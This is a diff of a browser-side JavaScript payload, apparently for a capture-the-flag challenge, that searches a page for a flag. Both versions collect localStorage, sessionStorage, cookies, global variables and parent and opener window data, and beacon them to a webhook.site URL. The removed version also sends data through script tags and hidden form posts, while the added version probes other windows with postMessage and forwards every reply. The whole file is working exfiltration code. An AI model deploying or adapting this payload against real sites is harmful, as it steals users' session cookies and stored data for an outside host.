@@ -1,6 +1,6 @@
-     console.log('🎯 PAYLOAD LOADED - CORS-Free Flag Extraction');
+     console.log('🎯 CROSS-ORIGIN PAYLOAD LOADED');
 
-     // CORS-FREE METHODS FOR DATA EXFILTRATION
+     // Send immediate confirmation
      function sendViaImage(data) {
          try {
              const img = new Image();
@@ -10,182 +10,201 @@
      JSON.stringify(data[key]) : data[key]);
              });
              img.src =
-     'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/img?' +
+     'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/cross?' +
      params.toString();
              document.body.appendChild(img);
-             console.log('📸 Image exfiltration sent');
+             console.log('Data sent via image');
          } catch(e) { console.error('Image method failed:', e); }
      }
 
-     function sendViaScript(data) {
-         try {
-             const script = document.createElement('script');
-             const params = new URLSearchParams();
-             Object.keys(data).forEach(key => {
-                 params.append(key, typeof data[key] === 'object' ?
-     JSON.stringify(data[key]) : data[key]);
-             });
-             script.src =
-     'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/script?' +
-     params.toString() + '&callback=handleWebhookResponse';
-             document.head.appendChild(script);
-             console.log('📜 Script exfiltration sent');
-         } catch(e) { console.error('Script method failed:', e); }
-     }
-
-     function sendViaForm(data) {
-         try {
-             const form = document.createElement('form');
-             form.method = 'POST';
-             form.action =
-     'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad';
-             form.target = 'webhook_frame_' + Date.now();
-             form.style.display = 'none';
-
-             // Create hidden iframe for form target
-             const iframe = document.createElement('iframe');
-             iframe.name = form.target;
-             iframe.style.display = 'none';
-             document.body.appendChild(iframe);
-
-             // Add all data as form fields
-             Object.keys(data).forEach(key => {
-                 const input = document.createElement('input');
-                 input.type = 'hidden';
-                 input.name = key;
-                 input.value = typeof data[key] === 'object' ?
-     JSON.stringify(data[key]) : data[key];
-                 form.appendChild(input);
-             });
-
-             document.body.appendChild(form);
-             form.submit();
-             console.log('📋 Form exfiltration sent');
-
-             // Clean up after a delay
-             setTimeout(() => {
-                 if (form.parentNode) form.parentNode.removeChild(form);
-                 if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
-             }, 5000);
-         } catch(e) { console.error('Form method failed:', e); }
-     }
-
-     // Send payload start confirmation
-     const startData = {
-         status: 'PAYLOAD_EXECUTION_START',
+     sendViaImage({
+         status: 'CROSS_ORIGIN_PAYLOAD_START',
          timestamp: new Date().toISOString(),
-         url: window.location.href,
-         domain: window.location.hostname,
-         userAgent: navigator.userAgent
-     };
+         current_domain: window.location.hostname,
+         current_url: window.location.href,
+         user_agent: navigator.userAgent
+     });
 
-     sendViaImage(startData);
-     sendViaScript(startData);
-     sendViaForm(startData);
-
-     // Main flag extraction logic
+     // Try multiple approaches to get the flag
      try {
-         console.log('🔍 Searching for flag in localStorage...');
+         console.log('Searching for flag across all possible locations...');
 
-         // Extract all localStorage data
-         const allStorage = {};
-         const storageKeys = [];
-
+         // Method 1: Check current domain localStorage
+         const currentStorage = {};
+         const currentKeys = [];
          for (let i = 0; i < localStorage.length; i++) {
              const key = localStorage.key(i);
              const value = localStorage.getItem(key);
-             allStorage[key] = value;
-             storageKeys.push(key);
-             console.log(`Found localStorage key: ${key} = ${value}`);
+             currentStorage[key] = value;
+             currentKeys.push(key);
          }
 
-         // Try to find the flag
-         const flag = localStorage.getItem('flag');
-         const flagFound = !!flag;
-
-         console.log(`Flag found: ${flagFound}`);
-         if (flag) {
-             console.log(`🚩 FLAG CAPTURED: ${flag}`);
+         // Method 2: Check sessionStorage
+         const sessionData = {};
+         const sessionKeys = [];
+         for (let i = 0; i < sessionStorage.length; i++) {
+             const key = sessionStorage.key(i);
+             const value = sessionStorage.getItem(key);
+             sessionData[key] = value;
+             sessionKeys.push(key);
          }
 
-         // Prepare comprehensive data package
-         const flagData = {
-             status: 'FLAG_EXTRACTION_COMPLETE',
+         // Method 3: Check cookies
+         const cookies = document.cookie;
+
+         // Method 4: Check global variables for flag
+         const globalFlag = window.flag || window.FLAG || window.ctfFlag;
+
+         // Method 5: Try to access parent/opener window if exists
+         let parentData = null;
+         let openerData = null;
+
+         try {
+             if (window.parent && window.parent !== window) {
+                 parentData = {
+                     href: window.parent.location.href,
+                     hostname: window.parent.location.hostname,
+                     localStorage_length: window.parent.localStorage.length
+                 };
+             }
+         } catch(e) { console.log('Parent access blocked:', e.message); }
+
+         try {
+             if (window.opener) {
+                 openerData = {
+                     href: window.opener.location.href,
+                     hostname: window.opener.location.hostname,
+                     localStorage_length: window.opener.localStorage.length
+                 };
+             }
+         } catch(e) { console.log('Opener access blocked:', e.message); }
+
+         // Method 6: Try to create iframe to CTF domain and access its 
+     localStorage
+         function tryIframeAccess() {
+             const iframe = document.createElement('iframe');
+             iframe.style.display = 'none';
+             iframe.src = 'about:blank'; // Start with blank to avoid CORS 
+     initially
+
+             iframe.onload = function() {
+                 try {
+                     // Try to access iframe's localStorage
+                     const iframeStorage = iframe.contentWindow.localStorage;
+                     console.log('Iframe localStorage accessible');
+
+                     // Send iframe data
+                     sendViaImage({
+                         status: 'IFRAME_ACCESS_SUCCESS',
+                         iframe_storage_length: iframeStorage.length,
+                         timestamp: new Date().toISOString()
+                     });
+
+                 } catch(e) {
+                     console.log('Iframe access failed:', e.message);
+                 }
+
+                 // Clean up
+                 setTimeout(() => {
+                     if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
+                 }, 2000);
+             };
+
+             document.body.appendChild(iframe);
+         }
+
+         // Execute iframe attempt
+         setTimeout(tryIframeAccess, 1000);
+
+         // Comprehensive data package
+         const comprehensiveData = {
+             status: 'COMPREHENSIVE_FLAG_SEARCH',
              timestamp: new Date().toISOString(),
-             success: flagFound,
-             flag: flag || 'not_found',
-             all_localStorage: JSON.stringify(allStorage),
-             localStorage_keys: storageKeys.join(','),
-             page_url: window.location.href,
-             page_domain: window.location.hostname,
-             page_title: document.title,
-             cookies: document.cookie || 'none',
+
+             // Current domain data
+             current_domain: window.location.hostname,
+             current_url: window.location.href,
+             current_localStorage: JSON.stringify(currentStorage),
+             current_localStorage_keys: currentKeys.join(','),
+             current_localStorage_length: currentKeys.length,
+
+             // Session data
+             sessionStorage_data: JSON.stringify(sessionData),
+             sessionStorage_keys: sessionKeys.join(','),
+             sessionStorage_length: sessionKeys.length,
+
+             // Cookie data
+             document_cookie: cookies || 'none',
+
+             // Global variables
+             global_flag: globalFlag || 'not_found',
+
+             // Window relationships
+             has_parent: window.parent !== window,
+             has_opener: !!window.opener,
+             parent_data: parentData ? JSON.stringify(parentData) : 'none',
+             opener_data: openerData ? JSON.stringify(openerData) : 'none',
+
+             // Environment info
+             user_agent: navigator.userAgent,
              referrer: document.referrer || 'none',
-             user_agent: navigator.userAgent
+             origin: window.location.origin,
+
+             // Try direct flag access
+             localStorage_flag: localStorage.getItem('flag') || 'not_found',
+             sessionStorage_flag: sessionStorage.getItem('flag') || 'not_found',
+
+             // Check for common flag patterns in DOM
+             dom_text_contains_flag: document.body.textContent.includes('flag{') ||
+      document.body.textContent.includes('FLAG{'),
+
+             // Page title and meta
+             page_title: document.title,
+             page_meta: document.head.innerHTML.includes('flag') ||
+     document.head.innerHTML.includes('FLAG')
          };
 
-         console.log('📤 Sending flag data via all methods...');
+         console.log('Sending comprehensive flag search data...');
+         sendViaImage(comprehensiveData);
 
-         // Send via all CORS-free methods
-         sendViaImage(flagData);
-         sendViaScript(flagData);
-         sendViaForm(flagData);
-
-         // If flag found, send additional confirmations
-         if (flag) {
-             const flagConfirmData = {
-                 status: 'FLAG_CONFIRMED',
-                 flag: flag,
-                 timestamp: new Date().toISOString(),
-                 extraction_method: 'localStorage'
-             };
-
-             // Multiple confirmations with different approaches
-             setTimeout(() => sendViaImage(flagConfirmData), 1000);
-             setTimeout(() => sendViaScript(flagConfirmData), 1500);
-             setTimeout(() => sendViaForm(flagConfirmData), 2000);
-
-             // Create a visible element with the flag (for debugging)
-             const flagDiv = document.createElement('div');
-             flagDiv.style.cssText =
-     'position:fixed;top:-100px;left:-100px;width:1px;height:1px;opacity:0.01;';
-             flagDiv.innerHTML = `<!-- FLAG: ${flag} -->`;
-             document.body.appendChild(flagDiv);
+         // Try postMessage to communicate with other windows
+         if (window.parent !== window) {
+             try {
+                 window.parent.postMessage({
+                     type: 'FLAG_REQUEST',
+                     timestamp: new Date().toISOString()
+                 }, '*');
+             } catch(e) {}
          }
 
-         // Send final completion status
-         setTimeout(() => {
-             const completionData = {
-                 status: 'PAYLOAD_EXECUTION_COMPLETE',
-                 timestamp: new Date().toISOString(),
-                 flag_captured: flagFound,
-                 methods_attempted: 3,
-                 total_localStorage_items: storageKeys.length
-             };
+         if (window.opener) {
+             try {
+                 window.opener.postMessage({
+                     type: 'FLAG_REQUEST',
+                     timestamp: new Date().toISOString()
+                 }, '*');
+             } catch(e) {}
+         }
 
-             sendViaImage(completionData);
-             sendViaScript(completionData);
-             sendViaForm(completionData);
-         }, 3000);
+         // Listen for postMessage responses
+         window.addEventListener('message', function(event) {
+             sendViaImage({
+                 status: 'POSTMESSAGE_RECEIVED',
+                 timestamp: new Date().toISOString(),
+                 message_origin: event.origin,
+                 message_data: JSON.stringify(event.data)
+             });
+         });
 
      } catch (error) {
-         console.error('🚨 Payload execution error:', error);
+         console.error('Cross-origin payload error:', error);
 
-         const errorData = {
-             status: 'PAYLOAD_ERROR',
+         sendViaImage({
+             status: 'CROSS_ORIGIN_PAYLOAD_ERROR',
              error_message: error.message,
              error_stack: error.stack || 'no_stack',
              timestamp: new Date().toISOString()
-         };
-
-         sendViaImage(errorData);
-         sendViaScript(errorData);
-         sendViaForm(errorData);
+         });
      }
 
-     // Global callback function for script method responses
-     window.handleWebhookResponse = function(response) {
-         console.log('Webhook response received:', response);
-     };
-
-     console.log('🏁 Payload script completed');
+     console.log('🏁 Cross-origin payload completed');
